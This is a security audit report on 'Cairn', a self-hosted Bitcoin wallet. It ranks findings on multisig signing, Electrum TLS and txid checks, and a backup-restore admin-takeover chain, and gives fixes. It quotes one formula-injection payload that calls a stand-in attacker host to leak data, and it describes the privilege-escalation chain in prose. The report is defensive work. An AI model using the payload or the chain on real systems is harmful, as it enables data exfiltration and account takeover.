# Cairn Security Audit — 2026-07-05

**Scope:** full codebase — PSBT construction/signing, authentication, input validation, Electrum
connectivity, key-material handling, API authorization, hardware-wallet integration,
dependencies, Docker/deployment, rate limiting.

**Bottom line:** no P0 (direct fund-theft / wrong-address-misdirection) finding survived
adversarial verification. Cairn's core "verify everything server-side before broadcast"
design — independent txid re-hashing of fetched prevouts, `assertSameTransaction`
re-checking the exact reviewed inputs/outputs before every broadcast, script/derivation
cross-checks against the wallet's own registered keys — held up under focused attack
attempts. Five real **P1** issues were confirmed, all bounded by a precondition (an
active network attacker with a MITM position, a cooperating malicious/buggy signing
device, or a social-engineered admin action) rather than being remotely and
unconditionally exploitable. One additional P0/P1-class finding (BitBox02 hardware-wallet
registration) was **fixed in the working tree while this audit was in progress** — see
§7. Beads were filed for all five open P1s plus a tracking task for the BitBox02 fix.

## Methodology

Ten specialized research passes ran in parallel, each tracing data flow end-to-end from
HTTP input to the security-relevant sink (PSBT bytes, broadcast call, DB write, cookie,
etc.) rather than reading files in isolation. The seven highest-stakes candidate findings
that came out of that pass were then re-examined by independent three-agent adversarial
panels, each instructed to actively try to **refute** the finding — read the real source,
check for a mitigating control, a misread line number, or existing test coverage — before
it was accepted into this report. One finding (BitBox02) was refuted outright because a
fix had landed in the working tree mid-audit; the finding's history and the fix are
recorded honestly in §7 rather than silently dropped. Severity notes below reflect the
verification panels' consensus, which in a few cases pushed severity down (cookie
`secure` flag) or reframed it (payment-notification forgery, TLS MITM) from the initial
pass.

## Severity legend

- **P0** — funds directly at risk (theft, misdirection, wrong-address send)
- **P1** — auth bypass, privilege escalation, data leak, or an unmitigated integrity gap with real fraud/deception potential
- **P2** — hardening opportunity; no active exploit path found, or exploit requires a significant precondition
- **P3** — best-practice / defense-in-depth nitpick

## Summary table — P0/P1 findings (beads filed)

| ID | Finding | File(s) | Severity | Bead |
|----|---------|---------|----------|------|
| F7 | Backup restore + account-reclaim chain bypasses registration lockdown → full admin takeover | `backup.ts`, `register/options`, `register/verify` | **P1** | `cairn-cpb5` |
| F4 | Electrum broadcast success never verified against locally-computed txid | `transactions.ts`, `multisigTransactions.ts`, `electrum/client.ts` | **P1** | `cairn-ziwm` |
| F2 | Electrum TLS certificate validation hardcoded off | `electrum/client.ts` | **P1** | `cairn-azei` |
| F3 | No SPV/merkle verification → forgeable payment notifications | `electrum/client.ts`, `addressWatcher.ts` | **P1** | `cairn-7zj6` |
| F1 | Multisig PSBT combine never enforces SIGHASH_ALL | `bitcoin/multisigPsbt.ts` | **P1** | `cairn-srte` |
| F6 | BitBox02 multisig signing skipped device registration | `hw/bitbox02.ts` | **Fixed during audit** (uncommitted) | `cairn-5kth` (verify/commit) |

No P0 findings were confirmed.

---

## 1. PSBT construction and signing

The highest-priority area, and the one that held up best. Destination-address and
change-address derivation are computed purely from server-side wallet state, never
trusted from PSBT input — a malicious or tampered PSBT cannot redirect funds to an
unintended address. `assertSameTransaction` (`psbt.ts:682-733`) recomputes a commitment
over every input (`txid:vout`) and output (`script:amount`) and rejects any divergence
from the reviewed draft before every broadcast (single-sig and multisig alike), which is
the load-bearing control the rest of the system leans on. Amounts are validated against
Electrum-reported UTXO data with an independent txid-hash re-check of fetched previous
transactions (closing the classic segwit fee-lying attack), fee rate is capped at 1000
sat/vB, and BIP32 derivation paths/fingerprints in multisig PSBTs are cross-checked
against the wallet's own registered keys rather than trusted from the PSBT.

**P1 — F1: `combineMultisigPsbts` never enforces SIGHASH_ALL** (`cairn-srte`)
`src/lib/server/bitcoin/multisigPsbt.ts:603-662` accepts co-signer `partialSig` entries
after checking only that they belong to the multisig's own keys and commit to the same
transaction — the DER signature's trailing sighash byte is never inspected, all the way
through `finalizeMultisigPsbt` and into the underlying `@scure/btc-signer` finalize path.
A co-signer or a buggy/malicious hardware wallet could supply a `SIGHASH_SINGLE`,
`SIGHASH_NONE`, or `ANYONECANPAY`-flagged signature and Cairn would combine, count it
toward quorum, finalize, and broadcast it without complaint. This does not enable direct
theft (`assertSameTransaction` still pins the reviewed inputs/outputs before combine, and
pubkey membership is checked), but it undermines that very guarantee for the affected
input — such a signature could legally be replayed onto a different, attacker-constructed
transaction spending the same input. Verifier consensus: real, unmitigated, medium-high
severity (not critical — requires a cooperating malicious/buggy signing device to
trigger). **Fix:** reject any `partialSig` whose trailing byte isn't `0x01` in
`combineMultisigPsbts`, with test coverage.

**P2 — Coinbase-maturity check fails open on a transient tip-height RPC failure.**
`psbt.ts:274` / `multisigPsbt.ts:285` skip the 100-block maturity guard entirely if the
chain-tip-height fetch fails, rather than blocking the send — a deliberate
availability-over-safety tradeoff ("never let a transient tip failure block an ordinary
send") that leaves a narrow window where an immature coinbase UTXO could be selected. Not
a fund-loss risk (the network itself rejects the resulting consensus-invalid transaction
at broadcast), but wastes a send attempt and could confuse a user mid-hardware-wallet
ceremony.

**P2 — No fee-sanity backstop on the fully-external stateless-broadcast path.** The
1000 sat/vB ceiling only applies to PSBTs Cairn itself constructs. `stateless/broadcast`
(the Caravan-style "paste a fully-combined PSBT" escape hatch) has no draft to compare
against and thus no fee check — bounded in practice by requiring cosigner collusion at
quorum, which could already move the funds anyway.

**P3s:** `multisigPsbt.test.ts` has no coinbase-maturity test coverage despite
duplicating `psbt.ts`'s maturity logic; `summarizePsbt`'s change-output identification
trusts an untrusted PSBT's `bip32Derivation` presence for *display* purposes only (no
fund-safety impact — the broadcast-time guard is independent); a fragile non-null
assertion in the multisig PSBT route relies on two separate ownership checks staying in
sync.

## 2. Authentication and session management

Password hashing is scrypt (`N=16384, r=8, p=1`) with a unique random 16-byte salt per
user and a `timingSafeEqual` compare — correct construction, but the cost parameter is
below current OWASP guidance (recommend `N≥2^17` for 2026). Session tokens are 256-bit
CSPRNG values, stored only as a SHA-256 hash, with a 30-day expiry checked server-side on
every request. Logout correctly invalidates the server-side session record. The
account-recovery flow (`recovery.ts`) is genuinely well-built: byte-identical generic
errors and constant-work dummy verification for unknown accounts/wrong secrets, atomic
single-use consumption of both recovery codes and the recovery grant token — a
noticeably more careful implementation than most self-hosted apps bother with.

**P1, downgraded to P2 on verification — cookie `secure` flag depends on an undocumented
adapter fallback.** `auth.ts:101` sets `secure: url.protocol === 'https:'`. Cairn's
Dockerfile sets `ADDRESS_HEADER` but not `ORIGIN` or `PROTOCOL_HEADER`, and
`@sveltejs/adapter-node` hardcodes the resolved protocol to `'https:'` whenever both are
unset — verified directly against the adapter's own source, including the shipped build
artifact. All three verification agents confirmed this is real but concluded the current,
shipped failure mode is **fail-safe, not fail-open**: the cookie ends up always marked
`Secure`, which actually *breaks* the documented plain-HTTP LAN/Umbrel deployment target
(browsers won't send a `Secure` cookie back over plain HTTP), rather than exposing a
session-hijack path. The more dangerous half of the original concern — an admin setting
`PROTOCOL_HEADER=x-forwarded-proto` without a stripping reverse proxy, letting a remote
client spoof the protocol — is real as a *latent trap* but requires that non-default,
undocumented configuration change; it isn't the shipped default. **Recommend:** set
`ORIGIN` explicitly for known deployment targets (e.g. Umbrel) rather than relying on
adapter-node's header-based protocol inference, and add a `PROTOCOL_HEADER` warning to
the README mirroring the existing `ADDRESS_HEADER` spoofing caveat.

**P1 — F7: backup/restore + account-reclaim chain bypasses registration lockdown**
(`cairn-cpb5`, detailed under §6 since it's fundamentally an authorization gap, but the
registration-gate half lives in the auth subsystem). See §6.

**P2s:**
- Recovery phrase/codes endpoints (`/api/auth/recovery/phrase`, `/recovery/codes`) mint
  and reveal a fresh high-value account-recovery secret for any valid session with no
  step-up re-authentication — a hijacked session cookie could be escalated into a durable
  recovery secret for later full takeover.
- CSRF protection is implicit (SvelteKit's default `checkOrigin` for form-action content
  types + `SameSite=Lax` + no CORS headers on JSON routes) and works, but is undocumented
  in-repo and untested — a future `svelte.config.js` addition for an unrelated reason
  could silently disable it with nothing to catch the regression.
- No self-service session revocation on password change — an attacker holding a stolen
  session token isn't logged out when the legitimate user changes their password
  (contrast: admin-disabling a user *does* correctly call `destroyUserSessions`).
- `webhookAllowPrivateTargets` (the webhook-channel SSRF escape hatch) has no
  confirmation step or audit-log entry when an admin flips it on.
- Backup-file passphrase strength is only checked for length ≥ 8, no complexity
  requirement, despite protecting xpubs/labels/emails.

**P3s:** invite-code redemption is check-then-act (safe today only because the app is
single-process/synchronous — would become a real double-spend bug if the DB access
pattern ever went async); `admin/settings` PUT performs no value validation
(`registrationMode`/`connectionMode`/`electrumPort` accept any string) unlike the
sibling `admin/notifications` endpoint; an admin can self-demote with no confirmation
when 2+ admins exist; a narrow TOCTOU on first-admin bootstrap in the password
registration path (already closed via a transaction in the passkey path); several minor
account-enumeration signals (disabled-account 403 vs. generic 401, `email_taken` at
signup, passkey-existence oracle at login); no dedicated test file for `recovery.ts`
despite being the most security-sensitive module; a stale comment in `rateLimit.ts`
claims "Auth is passkey-only" when password auth is in fact the default — a doc-hygiene
fix, not a security issue.

## 3. Input validation and injection

**P2 — CSV/formula injection.** `historyExport.ts:50-52` (`csvField`) only does
RFC-4180 quoting (comma/quote/newline) and doesn't neutralize a leading `=`, `+`, `-`, or
`@` in the user-editable transaction-label field. A label like
`=HYPERLINK("http://attacker.example/leak","open")` would execute as a formula if the
exported `history.csv` is opened in Excel/Sheets. Exploitation requires either the
labeler pasting an untrusted string as their own label, or sharing the exported file with
a third party (e.g. a bookkeeper) who opens it — not remotely triggerable by another
Cairn user. Only affects the single-sig CSV export; the multisig export doesn't include
labels. **Fix:** prefix an apostrophe when a trimmed label starts with `=+-@` or a tab,
before RFC-4180 quoting.

**Clean, no exploitable findings:**
- **SQL injection** — every DB access is a parameterized `.prepare()` call; the handful
  of template-literal `${...}` occurrences in SQL text are all closed, developer-defined
  enums (table-name selection between two hardcoded literals), never request data.
- **XSS** — zero uses of `{@html}` anywhere in the codebase; Svelte's default escaping
  covers everything; the Telegram notification channel (the one place using
  `parse_mode: 'HTML'`) explicitly escapes every field before composition.
- **Path traversal** — no route builds a filesystem path from user input; PSBTs/backups/
  PDFs are generated and streamed entirely in memory or read from a single fixed,
  hardcoded path (`CAIRN_DB`, `CAIRN_LOG_FILE`).
- **Prototype pollution** — the Caravan-import and backup-restore parsers both do
  explicit named-field extraction into fresh objects; no recursive merge or
  `Object.assign` on a long-lived target exists anywhere that touches parsed JSON.
- **Command injection / eval** — no `child_process`, `eval(`, `new Function(`, or `vm.`
  usage anywhere in the codebase.

**Notable positive finding (out of scope but worth flagging):** `channels/webhook.ts`
implements a genuinely thorough SSRF guard — DNS-resolves every hostname, checks every
resolved IP against blocked private/loopback/link-local ranges, blocks non-http(s)
schemes, and uses `redirect: 'manual'` to prevent redirect-based bypass.

## 4. Electrum server connection security

**P1 — F2: TLS certificate validation is unconditionally disabled** (`cairn-azei`).
`electrum/client.ts:146-153` hardcodes `rejectUnauthorized: false` for every TLS
connection, with no configuration path (env var, settings field, or cert-pinning option)
to enable real verification — confirmed to apply identically to the default public
server and to any admin-configured custom server. Any network-level attacker able to
intercept the path to the configured Electrum host can MITM with a self-signed cert and
Cairn accepts it silently. This is framed correctly as an **integrity/availability**
risk, not primarily confidentiality (no private keys or signing material transit this
channel) — but an active MITM can feed forged balances/UTXO sets/history/fee estimates,
or interfere with broadcast (see F4 below). **Fix:** default to
`rejectUnauthorized: true` with a documented, explicit opt-out for self-signed servers,
or implement TOFU certificate/fingerprint pinning.

**P1 — F3: no SPV/merkle verification → forgeable payment notifications** (`cairn-7zj6`).
No call to `blockchain.transaction.get_merkle` exists anywhere; `addressWatcher.ts`'s
`tx_received`/large-payment push notifications (fanning out to email/Telegram/ntfy/
webhook/Nostr) fire directly off unverified Electrum history data. Verification
surfaced an important nuance: the notification *amount* specifically comes from a
separate, independently-configured Esplora HTTP backend — a hostile Electrum server
acting **alone** can only produce a fake txid plus a generic, amount-less "New wallet
activity" notice; a fully convincing fake "X BTC received" notification requires the
attacker to also control or spoof the Esplora endpoint (realistic under a full-network
MITM, since both defaults are reachable over the same path, or in single-operator
self-hosted setups). Primarily a social-engineering/fraud-enablement risk (tricking a
user or merchant into believing a payment cleared) rather than a direct fund-loss path.
**Fix:** implement classic Electrum SPV (`get_merkle` + header-chain validation) before
trusting history/tx data for any user-facing notification, covering both the Electrum
and Esplora legs.

**P1 — F4: broadcast success is never verified against the locally-computed txid**
(`cairn-ziwm`). `finalizePsbt` (`psbt.ts:739-743`) computes the real txid locally (a
direct double-SHA256 of the finalized transaction), but `broadcastTransaction`
(`transactions.ts:382-431`, and identically in `multisigTransactions.ts`) discards it and
stores whatever txid string the Electrum server's `broadcast` RPC response contains, with
zero comparison. A malicious or misbehaving Electrum server can return an arbitrary fake
txid for a broadcast it silently never performed, and Cairn will record and display that
fake txid as a successful, completed send — while the real funds never left the wallet.
Tellingly, the existing test suite (`transactions.test.ts:183-189`) already asserts an
arbitrary, unrelated mocked txid is accepted and stored, meaning this behavior is
currently pinned down as "expected" rather than caught as a regression. This is a cheap,
mechanical fix, and the codebase already applies the identical defensive pattern a few
hundred lines away for fetched previous-transaction bytes. **Fix:** compare the
Electrum-reported txid against the locally-computed one after every broadcast (single-sig
and multisig) and reject on mismatch.

**P2 — no floor clamp on fee estimates.** The 1000 sat/vB ceiling guards against a
malicious high suggestion; there's no minimum-sanity check against a maliciously *low*
estimate from the Esplora backend, which could produce a stuck transaction (mitigated
by existing RBF support, assuming the user notices).

**P2 — hardcoded default public infrastructure.** Every fresh install defaults to
`electrum.blockstream.info` + `mempool.space` with no explicit first-run consent capture
— a privacy consideration for a "self-hosted" wallet (every derived address is disclosed
to two named third parties by default) more than a bug; switching to a custom node is a
one-flag admin operation.

**P3 —** no multi-server consensus/failover; a single configured server is fully trusted
with no cross-checking against a second source.

**Positive controls confirmed:** independent txid re-hash of any fetched previous
transaction before trusting it as a signing input (closes the classic fee-lying attack);
`assertSameTransaction` re-verification before every broadcast; coinbase maturity
enforcement independent of what Electrum reports; the 1000 sat/vB fee ceiling.

## 5. Key material handling and logging

**Overall: strong.** No private key material (mnemonics, xprv/yprv/zprv, WIF, seed bytes)
is generated, accepted, stored, or logged server-side anywhere. `parseXpub` actively
rejects private extended keys with an explicit error rather than silently storing them.
The one BIP39 mnemonic generator in the codebase (`recovery.ts`) is Cairn's own
account-login recovery secret, fully unrelated to Bitcoin wallet seeds — confirmed by
reading the module in full. `multisigBackupPdf.ts` (the printable break-glass backup) is
properly authenticated and ownership-scoped, generated fresh per request (never cached at
a guessable URL), and carries an explicit on-document privacy disclosure.

**P2s:**
- xpub storage is plaintext in the DB (expected/correct for a watch-only wallet), but
  worth a standing note: xpubs leak full wallet balance/history if they leak, so keep
  them out of logs and query strings as new features are added (confirmed clean today).
- No pino `redact` option is configured (`logger.ts:184-191`) — the "never log secrets"
  rule is enforced purely by developer discipline/code review, not mechanically. In
  practice the discipline held (zero `console.log` calls found anywhere in `src`, no
  secret/PSBT/xpub logging found), but a `redact` list would be cheap defense-in-depth
  against a future accidental log statement.
- `hooks.server.ts`'s path-redaction regex (`redactSegment`) doesn't explicitly cover
  xpub-length base58 strings — currently unreachable since no route places an xpub in a
  URL path, but worth closing before it becomes reachable.
- Roughly 40 route handlers forward a caught error's `.message` directly to the client.
  In every case checked this was an intentional, developer-authored message on a typed
  domain error (`MultisigError`, `AuthError`, etc.) — by design, not a leak. The residual
  risk is the `instanceof Error ? e.message : fallback` pattern: if a genuinely
  *unexpected* exception (raw SQLite error, filesystem error) ever bubbles through one of
  these route-level catches instead of the well-designed top-level `handleError` (which
  correctly logs stack traces server-side under a random `errorId` and returns only a
  generic message + that ID to the client), its raw message would reach the client
  verbatim.

## 6. API authorization

Every one of the ~90 `+server.ts` route handlers was read individually. The pattern is
consistent and correctly applied: `requireUser`/`requireAdmin` (`src/lib/server/api.ts`)
is called as the first statement of every handler, and every resource lookup is scoped by
`WHERE id = ? AND user_id = ?` (or the equivalent ownership condition) rather than
fetched by ID alone. **No IDOR was found anywhere** — passkey management, address book,
contacts, notifications, single-sig wallets/transactions, and multisig wallets/
transactions are all correctly scoped, including txId-to-wallet binding that prevents
reusing another wallet's transaction ID.

**P1 — F7: backup restore + account-reclaim chain bypasses registration lockdown**
(`cairn-cpb5`). Two individually-reasonable design choices chain into a full privilege
escalation:

1. `backup.ts` `restoreBackup()` (~lines 182-199) writes each imported user's `is_admin`
   flag verbatim from the untrusted decrypted backup file, with no cap against
   `adminCount()` and no distinct callout in the restore summary or audit log.
2. The account-**reclaim** registration path (`register/options`, `register/verify`) —
   triggered whenever an email matches an existing, credential-less user row — completely
   bypasses `assertCanRegister`, i.e. skips the instance's `registrationMode`
   (closed/invite/open) and invite-code checks entirely. This is deliberate, so a
   legitimate pre-existing account can be reclaimed via passkey registration without an
   invite — but it applies to *any* credential-less row, admin or not.

Chained: an attacker crafts a backup file containing a row
`{email: attacker-controlled, is_admin: 1, no credentials}`. An admin is social-engineered
into restoring it via the admin-gated restore endpoint (indistinguishable from routine
maintenance — no preview of which imported rows are privileged). The attacker then
registers a passkey for that email through the normal signup screen; the reclaim path
finds the credential-less admin row and grants full admin access immediately, with **no
invite code, no confirmation step, and no notification to existing admins** — even on an
instance explicitly locked to `registrationMode: closed`. Verified independently by three
adversarial reviewers with no refutation found. **Fix:** force imported `is_admin` to
`false` on restore (or require explicit re-confirmation for any admin row), still enforce
`registrationMode`/invite requirements for admin-account reclaim, and fire a distinct
notification whenever a restore imports an admin row or any reclaim completes.

**P1-severity functional gap (not a security vulnerability — fail-closed, spun off
separately, no bead):** the collaborative-custody wallet-sharing feature
(`getViewableMultisig`/`getSignableMultisig` in `wallets/multisig.ts:147-180`) is fully
implemented but never called by any route — every multisig route checks owner-only
access instead. A wallet shared with a cosigner via `POST .../shares` never appears in
their wallet list, and every sub-resource route 404s for them. This breaks the feature
entirely rather than exposing anything, so it isn't a security finding, but it's worth
fixing — tracked as a spawned follow-up task rather than a bead.

**P2 —** no explicit application-level body-size cap ahead of `readJson()` on
PSBT-upload/stateless-signing routes, beyond whatever SvelteKit/adapter-node's default
provides.

**P3s:** a few routes use bare `Number(params.id)` without the `Number.isInteger` guard
used elsewhere (harmless — falls through to a clean 404 on `NaN`); `PATCH
shares/[shareId]` doesn't cross-check the share's `multisig_id` against the route's `:id`
param (harmless today since ownership is still independently enforced, but a latent trap
for a future refactor); `admin/invites` DELETE silently no-ops on a nonexistent id; no
rate limiting on expensive authenticated Electrum-backed read routes (`mempool/*`,
`blocks*`, `address/[address]`).

## 7. Hardware wallet integration

**Fixed during the course of this audit — BitBox02 multisig registration** (`cairn-5kth`
tracks verification/commit). At the start of this audit, `signPsbtWithBitbox02`
(`src/lib/hw/bitbox02.ts`) called `paired.btcSignPSBT(...)` directly for multisig PSBTs
with no prior call to `btcRegisterScriptConfig`/`btcIsScriptConfigRegistered` — the
code's own comment explicitly deferred this to a not-yet-built "Unit F." This would have
been a P0/P1 trust-model integrity gap: a BitBox02 could be asked to sign a multisig
policy it had never registered (and thus never shown the user on-device for approval),
per the BitBox02 API's own documented contract that registration is required before
signing. Fund loss was bounded even in the worst case because Cairn's server-side
`finalizeMultisigPsbt` anchors the actually-spent script to server-stored wallet config,
not to whatever the device displayed — but the "verify on device" guarantee this whole
audit area exists to check would have been broken. **While this audit was in progress, a
fix landed in the working tree** (currently uncommitted): a `maybeRegisterMultisig()`
helper now checks `btcIsScriptConfigRegistered` and calls `btcRegisterScriptConfig` before
`btcSignPSBT` whenever the script config is multisig, with new regression tests covering
the not-yet-registered, already-registered, and single-sig cases. Three independent
adversarial verification agents confirmed the fix is real and correctly implemented,
refuting the original finding against current working-tree state. **Action needed:** run
the test suite and commit `bitbox02.ts`, `bitbox02.test.ts`, and
`MultisigBitboxSigner.svelte` together — until committed, this fix could be lost to an
accidental revert and the gap would silently reopen.

**Clean, no exploitable findings for the other three drivers or the rest of the BitBox02
flow:**
- **Change-output marking** is correctly server-anchored — a hardware wallet only marks
  an output as "ours" when it matches the wallet's own server-computed change address,
  which can't be spoofed by client-side data.
- **Derivation-path confusion** — all paths/fingerprints embedded in PSBTs originate from
  server-side wallet config, never client input; Ledger and Trezor each additionally
  cross-check the connected device's actual key against the expected one.
- **Ledger and Jade's multisig registration** are correctly implemented as
  register-then-sign (Ledger persists an HMAC server-side; Jade re-registers
  idempotently each time) — the contrast case that made the BitBox02 gap stand out.
- **Air-gapped QR flow** (BBQr/Coldcard-style) performs no client-side validation of a
  scanned-back "signed" PSBT, by design — but this is safely backstopped, since
  `assertSameTransaction` re-verifies the exact commitment server-side on both attach and
  broadcast regardless of which device/transport produced the signature.
- **Transport lifetime** — all four drivers close their WebHID/transport handle
  immediately after each operation in a scoped `try/finally`; no lingering global handle.
- **Error handling** fails closed consistently across all four drivers — signature-count
  mismatches, out-of-range indices, malformed DER, and foreign pubkeys are all rejected.

## 8. Dependencies

`npm audit`: 21 vulnerabilities (1 critical, 7 high, 2 moderate, 11 low). Traced the full
dependency chain for every critical/high entry: **all 8 trace to a single chain** —
`@trezor/connect-web` → `@trezor/protobuf` → `protobufjs` (arbitrary-code-execution and
prototype-pollution advisories, e.g. GHSA-xq3m-2v4x-88gg). This code is loaded lazily,
client-side only, the first time a user clicks "Connect Trezor" — it never runs
server-side and isn't reachable without explicit user action to connect a Trezor. No fix
is currently available without a semver-major Trezor Connect bump upstream
(`fixAvailable.isSemVerMajor: true`). **Recommend:** track upstream `@trezor/connect-web`
releases for a fix; no immediate action is blocking. The 2 moderate findings (`uuid`
missing buffer bounds checks, via `vite-plugin-top-level-await`) are build-time-only
tooling dependencies, not present in the runtime bundle.

## 9. Docker and deployment

Runs as a non-root user (`cairn:cairn`), session tokens are random 256-bit values with no
static secret to generate/manage/leak, and the health check uses Node's built-in `fetch`
(no `curl`/`wget` needed in the Alpine image). The README correctly documents the
`X-Forwarded-For` trust requirement for the login rate limiter.

**P2 —** the shipped `docker-compose.yml` exposes port 3000 directly to the host with no
bundled reverse proxy or TLS termination, while the Dockerfile's baked-in default
(`ADDRESS_HEADER=x-forwarded-for`) still trusts a client-spoofable header in exactly that
unproxied configuration — the README does document the caveat and instructs users to
unset the variable if unproxied, but the default one-command setup path doesn't
self-correct; a user who just runs `docker compose up` gets the trusting default with no
proxy in front of it. Related to the cookie/`ORIGIN` finding in §2 — recommend Cairn set
`ORIGIN` explicitly for documented deployment targets rather than relying on
adapter-node's header-based inference for either concern.

## 10. Rate limiting and DoS

Solid, purpose-built throttling: separate per-email and per-IP fixed windows for login
(5/email, 20/IP per 15 min), invite-code guessing (10/IP per 15 min), and account
recovery (5/email, 5/IP per hour, every attempt counted to prevent a
correct-then-flood bypass). All brute-forceable flows are covered.

**P2 —** no explicit application-level body-size cap on PSBT-upload/stateless-signing
JSON bodies beyond whatever SvelteKit/adapter-node's platform default provides (noted
in §6 too — same underlying gap, different angle).

**P3s —** no rate limiting on expensive authenticated Electrum-backed read routes;
limiter state is in-memory/per-process and resets on restart (an explicitly documented,
accepted trade-off for Cairn's single-process deployment model, not a silent gap).

---

## Full severity index

| # | Area | Finding | Severity | Bead / tracking |
|---|------|---------|----------|------------------|
| 1 | Auth | Backup restore + reclaim bypasses registration lockdown | **P1** | `cairn-cpb5` |
| 2 | Electrum | Broadcast txid never verified | **P1** | `cairn-ziwm` |
| 3 | Electrum | TLS cert validation hardcoded off | **P1** | `cairn-azei` |
| 4 | Electrum | No SPV → forgeable payment notifications | **P1** | `cairn-7zj6` |
| 5 | PSBT | Multisig combine doesn't enforce SIGHASH_ALL | **P1** | `cairn-srte` |
| 6 | Hardware wallet | BitBox02 registration gap | Fixed in working tree (uncommitted) | `cairn-5kth` |
| 7 | PSBT | Coinbase-maturity check fails open on tip-fetch failure | P2 | — |
| 8 | PSBT | No fee-sanity backstop on fully-external stateless broadcast | P2 | — |
| 9 | Auth | scrypt cost parameter below current OWASP guidance | P2 | — |
| 10 | Auth | Cookie `secure` flag depends on undocumented adapter fallback (fail-safe, breaks plain-HTTP deployments) | P2 | — |
| 11 | Auth | Recovery phrase/codes: no step-up re-auth | P2 | — |
| 12 | Auth | CSRF protection implicit/undocumented, untested | P2 | — |
| 13 | Auth | No session revocation on self-service password change | P2 | — |
| 14 | Auth | `webhookAllowPrivateTargets` toggle has no audit trail | P2 | — |
| 15 | Auth | Backup passphrase strength check is length-only | P2 | — |
| 16 | Injection | CSV/formula injection via transaction labels | P2 | — |
| 17 | Electrum | No fee-estimate floor clamp | P2 | — |
| 18 | Electrum | Hardcoded default public Electrum/Esplora servers (privacy) | P2 | — |
| 19 | Key handling | No pino `redact` config (discipline-only enforcement) | P2 | — |
| 20 | Key handling | Path-redaction regex doesn't cover xpub-length strings (latent) | P2 | — |
| 21 | Key handling | Caught-error `.message` forwarded to client in ~40 handlers | P2 | — |
| 22 | API authz | No body-size cap on PSBT-upload/stateless routes | P2 | — |
| 23 | Docker | Default compose config exposes port with trusting `ADDRESS_HEADER` default | P2 | — |
| 24 | Rate limiting | No body-size cap (duplicate of #22, different angle) | P2 | — |
| 25 | API authz (functional, not security) | Collaborative-custody sharing feature unreachable from any route | P1-functional | spawned follow-up task |
| 26+ | Various | ~15 additional P3 hardening/nitpick items | P3 | see per-section detail above |

## What to do next

1. Fix the five open P1s (`cairn-cpb5`, `cairn-ziwm`, `cairn-azei`, `cairn-7zj6`,
   `cairn-srte`) — none require an architecture change, all are targeted, testable code
   changes.
2. Run the test suite and commit the uncommitted BitBox02 fix (`cairn-5kth`) before it
   risks being lost.
3. Work through the P2 list opportunistically — several (scrypt cost, CSV injection,
   pino redact) are single-function fixes.
4. Re-run `npm audit` periodically to catch a `@trezor/connect-web` update that resolves
   the protobufjs chain.
